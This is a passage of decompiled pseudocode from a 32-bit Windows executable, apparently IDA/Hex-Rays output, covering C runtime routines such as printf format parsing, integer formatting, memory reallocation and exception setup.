  result = unknown_libname_70(0);
  if ( result )
  {
    __crt_stdio_output::string_output_adapter<char>::write_character(this[49], this + 24);
    return 1;
  }
  return result;
}
// 452727: using guessed type _DWORD __stdcall unknown_libname_70(_DWORD);
// 4530A6: using guessed type _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD);

//----- (00452788) --------------------------------------------------------
char __thiscall sub_452788(int this)
{
  int v2; // eax

  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_68(this + 40);
  *(_DWORD *)(this + 20) += 4;
  v2 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *(_DWORD *)(this + 40) = v2;
  if ( v2 < 0 )
    *(_DWORD *)(this + 40) = -1;
  return 1;
}
// 45251D: using guessed type _DWORD __stdcall unknown_libname_68(_DWORD);

//----- (004527B0) --------------------------------------------------------
char __thiscall sub_4527B0(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  char *v4; // edx
  char v5; // al
  _BYTE *v6; // eax

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_452919((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
  }
  else
  {
    if ( *((_DWORD *)this + 11) )
      goto LABEL_7;
    if ( v1 > 106 )
    {
      switch ( v1 )
      {
        case 'l':
          v6 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v6 == 108 )
          {
            *((_DWORD *)this + 11) = 4;
            *((_DWORD *)this + 4) = v6 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 3;
          }
          break;
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
          *((_DWORD *)this + 11) = 6;
          break;
      }
    }
    else
    {
      switch ( v1 )
      {
        case 'j':
          *((_DWORD *)this + 11) = 5;
          break;
        case 'I':
          v4 = (char *)*((_DWORD *)this + 4);
          v5 = *v4;
          if ( *v4 == 51 && v4[1] == 50 )
          {
            *((_DWORD *)this + 11) = 10;
            *((_DWORD *)this + 4) = v4 + 2;
          }
          else if ( v5 == 54 && v4[1] == 52 )
          {
            *((_DWORD *)this + 11) = 11;
            *((_DWORD *)this + 4) = v4 + 2;
          }
          else if ( v5 == 100 || v5 == 105 || v5 == 111 || v5 == 117 || v5 == 120 || v5 == 88 )
          {
            *((_DWORD *)this + 11) = 9;
          }
          break;
        case 'L':
          *((_DWORD *)this + 11) = 8;
          break;
        case 'T':
          *((_DWORD *)this + 11) = 13;
          break;
        case 'h':
          v3 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v3 == 104 )
          {
            *((_DWORD *)this + 11) = 1;
            *((_DWORD *)this + 4) = v3 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 2;
          }
          break;
      }
    }
  }
  return 1;
}

//----- (00452919) --------------------------------------------------------
char __thiscall sub_452919(int this)
{
  char v2; // bl
  int v3; // eax
  char v4; // al
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edx
  int v11; // edi
  char v12; // cl
  bool v13; // al
  bool v14; // al
  int v15; // ebx
  char v16; // [esp-4h] [ebp-10h]
  __int16 Src; // [esp+8h] [ebp-4h] BYREF
  char v18; // [esp+Ah] [ebp-2h]

  v2 = 1;
  v3 = *(char *)(this + 49);
  if ( v3 <= 100 )
  {
    if ( v3 != 100 )
    {
      if ( v3 > 88 )
      {
        v6 = v3 - 90;
        if ( !v6 )
        {
          v4 = unknown_libname_71(this);
          goto LABEL_11;
        }
        v7 = v6 - 7;
        if ( !v7 )
          goto LABEL_31;
        if ( v7 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v3 != 88 )
      {
        if ( v3 != 65 )
        {
          if ( v3 != 67 )
          {
            if ( v3 <= 68 )
              return 0;
            if ( v3 > 71 )
            {
              if ( v3 == 83 )
              {
LABEL_10:
                v4 = unknown_libname_75(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v4 = unknown_libname_73(0);
          goto LABEL_11;
        }
LABEL_31:
        v4 = unknown_libname_72(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v4 = sub_452E1C((_DWORD *)this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v3 > 112 )
  {
    v8 = v3 - 115;
    if ( !v8 )
      goto LABEL_10;
    v9 = v8 - 2;
    if ( v9 )
    {
      if ( v9 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v3 == 112 )
  {
    v4 = sub_452FF9((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v3 <= 103 )
    goto LABEL_31;
  switch ( v3 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v4 = sub_452E1C((_DWORD *)this, 10, 0);
      break;
    case 'n':
      v4 = unknown_libname_74(this);
      break;
    case 'o':
      v4 = sub_452FDA((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v4 )
    return 0;
  if ( *(_BYTE *)(this + 48) )
    return 1;
  v10 = *(_DWORD *)(this + 32);
  Src = 0;
  v11 = 0;
  v18 = 0;
  if ( (v10 & 0x10) != 0 )
  {
    if ( (v10 & 0x40) != 0 )
    {
      LOBYTE(Src) = 45;
LABEL_46:
      v11 = 1;
      goto LABEL_47;
    }
    if ( (v10 & 1) != 0 )
    {
      LOBYTE(Src) = 43;
      goto LABEL_46;
    }
    if ( (v10 & 2) != 0 )
    {
      LOBYTE(Src) = 32;
      goto LABEL_46;
    }
  }
LABEL_47:
  v12 = *(_BYTE *)(this + 49);
  if ( v12 != 120 && v12 != 88 || (v10 & 0x20) == 0 )
    v2 = 0;
  v13 = v12 == 97 || v12 == 65;
  if ( v2 || v13 )
  {
    *((_BYTE *)&Src + v11) = 48;
    v14 = v12 == 88 || v12 == 65;
    *((_BYTE *)&Src + v11 + 1) = !v14 ? 120 : 88;
    v11 += 2;
  }
  v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v11;
  if ( (v10 & 0xC) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  __crt_stdio_output::string_output_adapter<char>::write_string(&Src, v11, this + 24, *(_DWORD *)(this + 12));
  if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      48,
      v15,
      this + 24);
  unknown_libname_77(0);
  if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  return 1;
}
// 452313: using guessed type _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD);
// 452BCF: using guessed type int __thiscall unknown_libname_71(_DWORD);
// 452C32: using guessed type int __thiscall unknown_libname_72(_DWORD);
// 452D8C: using guessed type _DWORD __stdcall unknown_libname_73(_DWORD);
// 452F66: using guessed type int __thiscall unknown_libname_74(_DWORD);
// 453011: using guessed type int __thiscall unknown_libname_75(_DWORD);
// 4530E8: using guessed type _DWORD __stdcall unknown_libname_77(_DWORD);

//----- (00452B48) --------------------------------------------------------
char __thiscall sub_452B48(int this)
{
  int v2; // eax

  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_68(this + 36);
  *(_DWORD *)(this + 20) += 4;
  v2 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *(_DWORD *)(this + 36) = v2;
  if ( v2 < 0 )
  {
    *(_DWORD *)(this + 32) |= 4u;
    *(_DWORD *)(this + 36) = -*(_DWORD *)(this + 36);
  }
  return 1;
}
// 45251D: using guessed type _DWORD __stdcall unknown_libname_68(_DWORD);

//----- (00452E1C) --------------------------------------------------------
char __thiscall sub_452E1C(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  int v5; // ebx
  int v7; // ecx
  __int64 v8; // rax
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax

  v4 = __crt_stdio_output::to_integer_size(this[11]);
  v5 = v4;
  switch ( v4 )
  {
    case 1:
      v13 = this[8];
      this[5] += 4;
      v10 = (v13 & 0x10) == 0;
      v14 = this[5];
      if ( v10 )
        LODWORD(v8) = *(unsigned __int8 *)(v14 - 4);
      else
        LODWORD(v8) = *(char *)(v14 - 4);
      goto LABEL_16;
    case 2:
      v11 = this[8];
      this[5] += 4;
      v10 = (v11 & 0x10) == 0;
      v12 = this[5];
      if ( v10 )
        LODWORD(v8) = *(unsigned __int16 *)(v12 - 4);
      else
        LODWORD(v8) = *(__int16 *)(v12 - 4);
LABEL_16:
      v8 = (int)v8;
      v7 = v8;
      goto LABEL_17;
    case 4:
      v9 = this[8];
      this[5] += 4;
      v10 = (v9 & 0x10) == 0;
      LODWORD(v8) = this[5];
      if ( v10 )
      {
        v7 = *(_DWORD *)(v8 - 4);
        HIDWORD(v8) = 0;
        goto LABEL_17;
      }
      LODWORD(v8) = *(_DWORD *)(v8 - 4);
      goto LABEL_16;
  }
  if ( v4 != 8 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  this[5] += 8;
  LODWORD(v8) = this[5];
  v7 = *(_DWORD *)(v8 - 8);
  HIDWORD(v8) = *(_DWORD *)(v8 - 4);
LABEL_17:
  if ( (this[8] & 0x10) != 0 && v8 < 0 )
  {
    v7 = -v7;
    HIDWORD(v8) = (unsigned __int64)-__SPAIR64__(HIDWORD(v8), v7) >> 32;
    this[8] |= 0x40u;
  }
  if ( (int)this[10] >= 0 )
  {
    this[8] &= ~8u;
    if ( (int)this[10] > 512 )
      this[10] = 512;
  }
  else
  {
    this[10] = 1;
  }
  if ( !__PAIR64__(v7, HIDWORD(v8)) )
    this[8] &= ~0x20u;
  if ( v5 == 8 )
    unknown_libname_63(v7, HIDWORD(v8), a2, a3);
  else
    unknown_libname_62(v7, a2, a3);
  if ( (this[8] & 0x80) != 0 && (!this[14] || *(_BYTE *)this[13] != 48) )
  {
    *(_BYTE *)--this[13] = 48;
    ++this[14];
  }
  return 1;
}
// 452216: using guessed type _DWORD __stdcall unknown_libname_62(_DWORD, _DWORD, char);
// 45228B: using guessed type _DWORD __stdcall unknown_libname_63(_DWORD, _DWORD, _DWORD, char);
// 452B73: using guessed type int __cdecl __crt_stdio_output::to_integer_size(_DWORD);

//----- (00452FDA) --------------------------------------------------------
char __thiscall sub_452FDA(_DWORD *this)
{
  if ( (this[8] & 0x20) != 0 )
    this[8] |= 0x80u;
  return sub_452E1C(this, 8, 0);
}

//----- (00452FF9) --------------------------------------------------------
char __thiscall sub_452FF9(_DWORD *this)
{
  this[10] = 8;
  this[11] = 10;
  return sub_452E1C(this, 16, 1);
}

//----- (00453837) --------------------------------------------------------
char *__cdecl sub_453837(void *Block, unsigned int a2, unsigned int a3)
{
  size_t v4; // edi
  unsigned int v5; // esi
  char *v6; // ebx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  if ( a2 && 0xFFFFFFE0 / a2 < a3 )
  {
    *_errno() = 12;
    return 0;
  }
  else
  {
    if ( Block )
      v4 = _msize(Block);
    else
      v4 = 0;
    v5 = a3 * a2;
    v6 = (char *)_realloc_base(Block, a3 * a2);
    if ( v6 )
    {
      if ( v4 < v5 )
        memset(&v6[v4], 0, v5 - v4);
    }
    return v6;
  }
}

//----- (00453C3D) --------------------------------------------------------
int __cdecl sub_453C3D(int a1)
{
  int result; // eax

  result = a1;
  dword_492AC4 = a1;
  return result;
}
// 492AC4: using guessed type int dword_492AC4;

//----- (00454160) --------------------------------------------------------
void *__cdecl sub_454160(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_492BE4 )
    return (void *)unknown_libname_78(*a1);
  return result;
}

//----- (0045417B) --------------------------------------------------------
void *__cdecl sub_45417B(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_492BE0 )
    return (void *)unknown_libname_78(*a1);
  return result;
}

//----- (00454274) --------------------------------------------------------
int __cdecl sub_454274(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 454223: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 454274: using guessed type int var_8;

//----- (0045429C) --------------------------------------------------------
int __cdecl sub_45429C(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 4541D2: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 45429C: using guessed type int var_8;

//----- (00454525) --------------------------------------------------------
int __cdecl sub_454525(_onexit_t Function)
{
  return _register_onexit_function(&stru_492BE8, Function);
}

//----- (004545B9) --------------------------------------------------------
char sub_4545B9()
{
  unknown_libname_56(&off_48C620);
  return 1;
}
// 44D783: using guessed type _DWORD __stdcall unknown_libname_56(_DWORD);
// 48C620: using guessed type wchar_t *off_48C620;

//----- (004545E5) --------------------------------------------------------
char sub_4545E5()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 454196: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (0045462A) --------------------------------------------------------
__vcrt_bool sub_45462A()
{
  return __vcrt_uninitialize(0);
}

//----- (004546CE) --------------------------------------------------------
int sub_4546CE()
{
  return dword_492C00;
}
// 492C00: using guessed type int dword_492C00;

//----- (004546D4) --------------------------------------------------------
int __cdecl sub_4546D4(int a1)
{
  int result; // eax

  result = a1;
  dword_492C00 = a1;
  return result;
}
// 492C00: using guessed type int dword_492C00;

//----- (004546FC) --------------------------------------------------------
int __cdecl sub_4546FC(int a1)
{
  return unknown_libname_56(a1);
}
// 44D783: using guessed type _DWORD __stdcall unknown_libname_56(_DWORD);

//----- (00454862) --------------------------------------------------------
int __cdecl sub_454862(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_493020;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 493020: using guessed type int dword_493020;

//----- (00454A1A) --------------------------------------------------------
int __cdecl sub_454A1A(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 4549D7: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 454A1A: using guessed type int var_8;

//----- (00454A42) --------------------------------------------------------
void __thiscall sub_454A42(_DWORD *this)
{
  void *v2; // esi
  int v3[5]; // [esp+8h] [ebp-14h] BYREF

  v2 = _calloc_base(1u, 0xB8u);
  *(_DWORD *)*this = v2;
  _free_base(0);
  if ( v2 )
  {
    v3[0] = *this;
    v3[1] = this[1];
    v3[2] = this[2];
    v3[3] = this[3];
    v3[4] = this[4];
    sub_454A1A(4, (int)v3);
  }
}

//----- (00454C02) --------------------------------------------------------
__int32 sub_454C02()
{
  return _InterlockedExchange(&dword_492C0C, 1);
}
// 492C0C: using guessed type int dword_492C0C;

//----- (00455B11) --------------------------------------------------------
int sub_455B11()
{
  return dword_492C10;
}
// 492C10: using guessed type int dword_492C10;

//----- (00455B46) --------------------------------------------------------
int *sub_455B46()
{
  return &dword_492C14;
}
// 492C14: using guessed type int dword_492C14;

//----- (00456E66) --------------------------------------------------------
int __cdecl sub_456E66(int a1)
{
  int v1; // ecx
  int v3; // [esp-14h] [ebp-14h] BYREF
  int v4; // [esp-10h] [ebp-10h]
  int v5; // [esp-Ch] [ebp-Ch]
  int v6; // [esp-8h] [ebp-8h]
  int v7; // [esp-4h] [ebp-4h]

  v7 = v1;
  v6 = 1;
  v5 = 10;
  v4 = v1;
  v3 = v1;
  unknown_libname_60(&v3, a1, 0);
  return __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<char>>(0, v3, v4, v5, v6);
}
// 456E6B: variable 'v1' is possibly undefined
// 4519A2: using guessed type _DWORD __cdecl unknown_libname_60(_DWORD, _DWORD, _DWORD);

//----- (00457048) --------------------------------------------------------
int __cdecl sub_457048(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(
           &v3,
           a2,
           &v4);
}
// 456F54: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD);
// 457048: using guessed type int var_8;

//----- (00457070) --------------------------------------------------------
int __cdecl sub_457070(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(
           &v3,
           a2,
           &v4);
}
// 456F04: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD);
// 457070: using guessed type int var_8;

//----- (00457098) --------------------------------------------------------
int __cdecl sub_457098(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(
           &v3,
           a2,
           &v4);
}
// 456FB5: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD);
// 457098: using guessed type int var_8;

//----- (004570C0) --------------------------------------------------------
int __cdecl sub_4570C0(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(
           &v3,
           a2,
           &v4);
}
// 457000: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD);
// 4570C0: using guessed type int var_8;

//----- (00457A9B) --------------------------------------------------------
int __cdecl sub_457A9B(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(
           &v3,
           a2,
           &v4);
}
// 457A03: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD);
// 457A9B: using guessed type int var_8;

//----- (0045843B) --------------------------------------------------------
int __cdecl sub_45843B(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(
           &v3,
           a2,
           &v4);
}
// 4583B9: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD);
// 45843B: using guessed type int var_8;

//----- (00458463) --------------------------------------------------------
int __cdecl sub_458463(int a1)
{
  int *v2; // [esp+4h] [ebp-4h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_492E18
      && ((int)lpCriticalSection[a1 >> 6][2 * (a1 & 0x3F) + 1].LockSemaphore & 1) != 0 )
    {
      v2 = &a1;
      return sub_45843B(a1, (int)&v2);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 492C18: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];
// 492E18: using guessed type int dword_492E18;

//----- (00458840) --------------------------------------------------------
int __cdecl sub_458840(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(
           &v3,
           a2,
           &v4);
}
// 4587BC: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(_DWORD, _DWORD, _DWORD);
// 458840: using guessed type int var_8;

//----- (0045A6CC) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_45A6CC(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
  if ( *a2 != dword_492F00 )
  {
    result = (struct __crt_locale_data *)dword_48C6F0;
    if ( (dword_48C6F0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)__acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 45FF62: using guessed type int __acrt_update_thread_locale_data(void);
// 48C6F0: using guessed type int dword_48C6F0;

//----- (0045A6F9) --------------------------------------------------------
void *__cdecl sub_45A6F9(int a1, void **a2)
{
  void *result; // eax

  result = *a2;
  if ( *a2 != off_48CCA8 )
  {
    result = (void *)dword_48C6F0;
    if ( (dword_48C6F0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (void *)__acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}
// 45E743: using guessed type int __acrt_update_thread_multibyte_data(void);
// 48C6F0: using guessed type int dword_48C6F0;

//----- (0045AE2A) --------------------------------------------------------
int __cdecl sub_45AE2A(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(
           &v3,
           a2,
           &v4);
}
// 45ADD0: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD);
// 45AE2A: using guessed type int var_8;

//----- (0045C935) --------------------------------------------------------
int sub_45C935()
{
  dword_49342C = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 49342C: using guessed type int dword_49342C;

//----- (0045E184) --------------------------------------------------------
int __thiscall sub_45E184(_DWORD **this, void *Block)
{
  int v3; // edi

  v3 = unknown_libname_86();
  if ( v3 )
  {
    _free_base(Block);
    return v3;
  }
  else
  {
    *this[1]++ = Block;
    return 0;
  }
}
// 45E1B9: using guessed type int unknown_libname_86(void);

//----- (0045E28E) --------------------------------------------------------
int __cdecl sub_45E28E(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 45E24B: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 45E28E: using guessed type int var_8;

//----- (0045EB2B) --------------------------------------------------------
char sub_45EB2B()
{
  hHeap = 0;
  return 1;
}

//----- (00465904) --------------------------------------------------------
int __cdecl sub_465904(double a1)
{
  return _ceil_default(a1);
}

//----- (004659EE) --------------------------------------------------------
int __stdcall sub_4659EE(int a1, char *a2, int a3)
{
  const struct _s_ThrowInfo *v4; // [esp+0h] [ebp-20h]

  *((_DWORD *)a2 + 1) = 1;
  *((_DWORD *)a2 + 2) = 1;
  *(_DWORD *)a2 = `anonymous namespace'::_ExceptionPtr_static<std::bad_alloc>::`vftable';
  sub_4295F3((_DWORD *)a2 + 23);
  `anonymous namespace'::_PopulateCppExceptionRecord(
    (_anonymous_namespace_ *)(a2 + 12),
    (struct _EXCEPTION_RECORD *)(a2 + 92),
    &_TI2_AVbad_alloc_std__,
    v4);
  return 1;
}
// 465A3E: variable 'v4' is possibly undefined
// 47D1A8: using guessed type int (*`anonymous namespace'::_ExceptionPtr_static<std::bad_alloc>::`vftable'[2])();

//----- (00465A5E) --------------------------------------------------------
int __stdcall sub_465A5E(int a1, char *a2, int a3)
{
  const struct _s_ThrowInfo *v4; // [esp+0h] [ebp-20h]

  *((_DWORD *)a2 + 1) = 1;
  *((_DWORD *)a2 + 2) = 1;
  *(_DWORD *)a2 = `anonymous namespace'::_ExceptionPtr_static<std::bad_exception>::`vftable';
  sub_447017((_DWORD *)a2 + 23);
  `anonymous namespace'::_PopulateCppExceptionRecord(
    (_anonymous_namespace_ *)(a2 + 12),
    (struct _EXCEPTION_RECORD *)(a2 + 92),
    &_TI2_AVbad_exception_std__,
    v4);
  return 1;
}
// 465AAE: variable 'v4' is possibly undefined
// 47D1BC: using guessed type int (*`anonymous namespace'::_ExceptionPtr_static<std::bad_exception>::`vftable'[2])();

//----- (00465BBC) --------------------------------------------------------
char *__thiscall sub_465BBC(char *Block, char a2)
{
  unknown_libname_1(Block + 92);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 401643: using guessed type int __thiscall unknown_libname_1(_DWORD);

